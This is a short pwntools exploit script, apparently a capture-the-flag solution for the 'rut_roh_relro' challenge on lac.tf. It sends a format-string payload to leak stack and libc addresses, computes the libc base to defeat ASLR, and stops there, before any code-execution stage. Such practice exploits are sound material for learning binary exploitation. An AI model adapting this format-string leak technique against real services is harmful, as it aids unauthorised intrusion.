from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
#context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./rut_roh_relro"
libc_path = "./libc.so.6"
ld_path = "./ld-2.31.so"

elf, rop = ELF(vuln_path), ROP(vuln_path)
libc, roplibc = ELF(libc_path), ROP(libc_path)

if not f_remote:
    #io = process(vuln_path)
    io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
else:
    io = remote("lac.tf", 31135)


def ddebug(b=""):
    if not f_gdb:
        return

    gdb.attach(io, gdbscript=b)
    pause()


delta = 0x7ffd18849be7 - 0x7ffd18849a10
libcdelate = 0x7fd96fcf5604 - 0x7fd96fc50000

payload = "%60$p-%61$p"
io.sendlineafter("to post?\n", payload)
io.recvuntil("\n")
rbp_0x200 = int(io.recvuntil("-")[:-1], 16) - delta
success("rsp -> " + hex(rbp_0x200))

libc.address = int(io.recvuntil("\n"), 16) - libcdelate
success("libcaddress -> " + hex(libc.address))
io.interactive()
